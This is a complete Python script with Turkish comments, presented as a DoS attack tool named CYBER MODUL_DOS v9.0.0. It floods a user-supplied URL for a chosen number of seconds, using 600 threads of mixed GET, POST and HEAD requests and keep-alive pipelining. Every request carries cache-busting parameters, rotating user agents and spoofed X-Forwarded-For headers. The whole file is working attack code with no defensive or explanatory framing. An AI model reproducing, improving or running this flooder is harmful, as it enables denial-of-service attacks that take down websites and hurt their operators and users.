# ============================================================
# CYBER - MODUL_DOS v9.0.0 - SÜRE BAZLI SON SÜRÜM
# Root gerektirmez. HTTP/HTTPS flood.
# Link gir -> kaç saniye çalışsın gir -> süre boyunca DURMAZ.
# 8 GB RAM için optimize: 600 thread.
# ============================================================

import os
import sys
import time
import random
import socket
import ssl
import threading
import string
import urllib.parse

class R:
    K="\033[91m"; Y="\033[92m"; S="\033[93m"; M="\033[94m"
    MO="\033[95m"; C="\033[96m"; B="\033[97m"; SF="\033[0m"; KA="\033[1m"

# ---------- AYARLAR (8 GB RAM için) ----------
ZOMBI = 600
TIMEOUT = 15.0
METODLAR = ["GET", "GET", "GET", "POST", "HEAD"]

KULLANICI_AJANLARI = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
]

REFERER = ["https://www.google.com/","https://www.bing.com/","https://yandex.com/",
           "https://www.facebook.com/","https://twitter.com/","https://www.reddit.com/",""]

# ---------- İSTATİSTİK ----------
IST = {
    "giden": 0, "gitmeyen": 0, "bayt": 0,
    "bas": 0.0, "kilit": threading.Lock(), "dur": threading.Event(),
}

def temizle():
    os.system("clear" if os.name != "nt" else "cls")

def banner():
    temizle()
    print(f"""{R.C}{R.KA}
 ██████╗██╗   ██╗██████╗ ███████╗██████╗ 
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝
██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗
╚██████╗   ██║   ██████╔╝███████╗██║  ██║
 ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
{R.SF}""")
    print(f"{R.MO}{R.KA}              DOS SALDIRI ARACI{R.SF}")
    print(f"{R.MO}{R.KA}                 Kurucu: CAN{R.SF}\n")

def rastgele_metin(u: int) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=u))

def hedef_ayristir(hedef: str):
    hedef = hedef.strip()
    if not hedef.startswith("http://") and not hedef.startswith("https://"):
        hedef = "http://" + hedef
    p = urllib.parse.urlparse(hedef)
    ssl_aktif = (p.scheme == "https")
    host = p.hostname
    port = p.port or (443 if ssl_aktif else 80)
    yol = p.path or "/"
    if p.query:
        yol += "?" + p.query
    return host, port, yol, ssl_aktif

def istek_olustur(host: str, yol: str, metod: str) -> bytes:
    ua = random.choice(KULLANICI_AJANLARI)
    referer = random.choice(REFERER)
    ayrac = "&" if "?" in yol else "?"
    tam_yol = f"{yol}{ayrac}{rastgele_metin(6)}={rastgele_metin(12)}&_={int(time.time()*1000)}"
    satirlar = [
        f"{metod} {tam_yol} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {ua}",
        f"Accept: */*",
        f"Accept-Language: tr-TR,tr;q=0.9,en;q=0.8",
        f"Accept-Encoding: identity",
        f"Referer: {referer}" if referer else "Referer: ",
        f"Connection: keep-alive",
        f"Cache-Control: no-cache, no-store, must-revalidate",
        f"Pragma: no-cache",
        f"X-Forwarded-For: {'.'.join(str(random.randint(1,254)) for _ in range(4))}",
        f"X-Real-IP: {'.'.join(str(random.randint(1,254)) for _ in range(4))}",
    ]
    if metod == "POST":
        veri = rastgele_metin(random.randint(128, 2048))
        satirlar.append(f"Content-Type: application/x-www-form-urlencoded")
        satirlar.append(f"Content-Length: {len(veri)}")
        return ("\r\n".join(satirlar) + "\r\n\r\n" + veri).encode()
    return ("\r\n".join(satirlar) + "\r\n\r\n").encode()

def baglanti_ac(host: str, port: int, ssl_aktif: bool, timeout: float = TIMEOUT):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.settimeout(timeout)
        s.connect((host, port))
        if ssl_aktif:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        return s
    except Exception:
        return None

# ---------- ZOMBİ: KARIŞIK METOD ----------
def zombi_karisik(host: str, port: int, yol: str, ssl_aktif: bool):
    while not IST["dur"].is_set():
        s = baglanti_ac(host, port, ssl_aktif)
        if not s:
            with IST["kilit"]:
                IST["gitmeyen"] += 1
            continue
        try:
            metod = random.choice(METODLAR)
            istek = istek_olustur(host, yol, metod)
            s.sendall(istek)
            try:
                yanit = s.recv(65536)
            except Exception:
                yanit = b""
            with IST["kilit"]:
                IST["giden"] += 1
                IST["bayt"] += len(istek) + len(yanit)
        except Exception:
            with IST["kilit"]:
                IST["gitmeyen"] += 1
        finally:
            try: s.close()
            except Exception: pass

# ---------- ZOMBİ: KEEP-ALIVE PIPELINE ----------
def zombi_keepalive(host: str, port: int, yol: str, ssl_aktif: bool):
    while not IST["dur"].is_set():
        s = baglanti_ac(host, port, ssl_aktif)
        if not s:
            with IST["kilit"]:
                IST["gitmeyen"] += 1
            continue
        try:
            for _ in range(30):
                if IST["dur"].is_set():
                    break
                metod = random.choice(METODLAR)
                istek = istek_olustur(host, yol, metod)
                s.sendall(istek)
                with IST["kilit"]:
                    IST["giden"] += 1
                    IST["bayt"] += len(istek)
            try:
                yanit = s.recv(65536)
                with IST["kilit"]:
                    IST["bayt"] += len(yanit)
            except Exception:
                pass
        except Exception:
            with IST["kilit"]:
                IST["gitmeyen"] += 1
        finally:
            try: s.close()
            except Exception: pass

# ---------- CANLI İSTATİSTİK ----------
def istatistik_yaz():
    onceki_g = 0
    onceki_b = 0
    onceki_z = time.time()
    while not IST["dur"].is_set():
        time.sleep(0.5)
        with IST["kilit"]:
            simdi = time.time()
            gecen = simdi - onceki_z if onceki_z else 0.5
            if gecen <= 0: gecen = 0.5
            f_g = IST["giden"] - onceki_g
            f_b = IST["bayt"] - onceki_b
            hiz_i = f_g / gecen
            hiz_mb = (f_b / (1024*1024)) / gecen
            toplam_mb = IST["bayt"] / (1024*1024)
            gecen_top = time.time() - IST["bas"]
            kalan = max(0, IST["sure"] - gecen_top)
            onceki_g = IST["giden"]
            onceki_b = IST["bayt"]
            onceki_z = simdi
            sys.stdout.write(
                f"\r{R.Y}GİDEN:{R.SF} {IST['giden']:>7}  "
                f"{R.K}GİTMEYEN:{R.SF} {IST['gitmeyen']:>7}  "
                f"{R.MO}MB:{R.SF} {toplam_mb:>8.2f}  "
                f"{R.C}MB/s:{R.SF} {hiz_mb:>7.2f}  "
                f"{R.S}istek/s:{R.SF} {hiz_i:>6.0f}  "
                f"{R.MO}kalan:{R.SF} {kalan:>5.0f}s   "
            )
            sys.stdout.flush()

# ---------- ANA SALDIRI ----------
def dos_baslat(hedef: str, sure: int):
    host, port, yol, ssl_aktif = hedef_ayristir(hedef)
    print(f"{R.S}Host        : {R.Y}{host}{R.SF}")
    print(f"{R.S}Port        : {R.Y}{port}{R.SF}")
    print(f"{R.S}Yol         : {R.Y}{yol}{R.SF}")
    print(f"{R.S}SSL         : {R.Y}{'AÇIK' if ssl_aktif else 'KAPALI'}{R.SF}")
    print(f"{R.S}Süre        : {R.Y}{sure} sn{R.SF}")
    print(f"{R.S}Thread      : {R.Y}{ZOMBI}{R.SF}")
    print(f"{R.S}Mod         : {R.Y}Karışık GET/POST/HEAD + Keep-Alive{R.SF}\n")

    test = baglanti_ac(host, port, ssl_aktif, timeout=8.0)
    if not test:
        print(f"{R.K}Hedefe bağlanılamadı!{R.SF}")
        return
    try: test.close()
    except Exception: pass
    print(f"{R.Y}Hedef erişilebilir. Saldırı başlıyor...{R.SF}")
    print(f"{R.S}Süre boyunca DURMAYACAK.{R.SF}\n")

    IST.update({"giden": 0, "gitmeyen": 0, "bayt": 0, "bas": time.time(), "sure": sure})
    IST["dur"].clear()

    # Thread'leri başlat
    thread_listesi = []
    for i in range(ZOMBI):
        if i % 2 == 0:
            t = threading.Thread(target=zombi_karisik, args=(host, port, yol, ssl_aktif), daemon=True)
        else:
            t = threading.Thread(target=zombi_keepalive, args=(host, port, yol, ssl_aktif), daemon=True)
        t.start()
        thread_listesi.append(t)
        if i % 50 == 0:
            time.sleep(0.005)

    threading.Thread(target=istatistik_yaz, daemon=True).start()

    # SADECE SÜRE KONTROLÜ - kullanıcı CTRL+C yapmadıkça DURMAZ
    try:
        while True:
            gecen = time.time() - IST["bas"]
            if gecen >= sure:
                break
            time.sleep(0.2)
    except KeyboardInterrupt:
        print(f"\n{R.S}Kullanıcı durdurdu.{R.SF}")

    # Süre doldu -> dur sinyali
    IST["dur"].set()
    for t in thread_listesi:
        t.join(timeout=2)
    print()
    with IST["kilit"]:
        mb = IST["bayt"] / (1024*1024)
        g = time.time() - IST["bas"]
        print(f"\n{R.Y}{'='*62}{R.SF}")
        print(f"{R.Y}              CYBER DOS v9.0.0 RAPORU{R.SF}")
        print(f"{R.Y}{'='*62}{R.SF}")
        print(f"{R.C}Hedef              : {R.SF}{host}:{port}{yol}")
        print(f"{R.C}Çalışma süresi     : {R.SF}{sure} sn")
        print(f"{R.C}Giden istek        : {R.SF}{IST['giden']}")
        print(f"{R.C}Gitmeyen istek     : {R.SF}{IST['gitmeyen']}")
        print(f"{R.C}Toplam trafik      : {R.SF}{mb:.2f} MB")
        print(f"{R.C}Geçen süre         : {R.SF}{g:.1f} sn")
        print(f"{R.C}Ortalama hız       : {R.SF}{mb/g if g>0 else 0:.2f} MB/s")
        print(f"{R.C}Ortalama istek/s   : {R.SF}{IST['giden']/g if g>0 else 0:.0f}")
        print(f"{R.Y}{'='*62}{R.SF}")

# ---------- MENÜ ----------
def ddos_menu():
    banner()
    hedef = input(f"{R.C}Hedef link (örn: http://site.com) > {R.SF}").strip()
    if not hedef:
        print(f"{R.K}Link boş olamaz.{R.SF}")
        return
    sure_s = input(f"{R.C}Kaç saniye çalışsın (örn: 60) > {R.SF}").strip()
    if not sure_s.isdigit():
        print(f"{R.K}Geçersiz sayı.{R.SF}")
        return
    sure = int(sure_s)
    onay = input(f"{R.C}Başlat? (e/h) > {R.SF}").strip().lower()
    if onay != "e":
        print(f"{R.K}İptal edildi.{R.SF}")
        return
    dos_baslat(hedef, sure)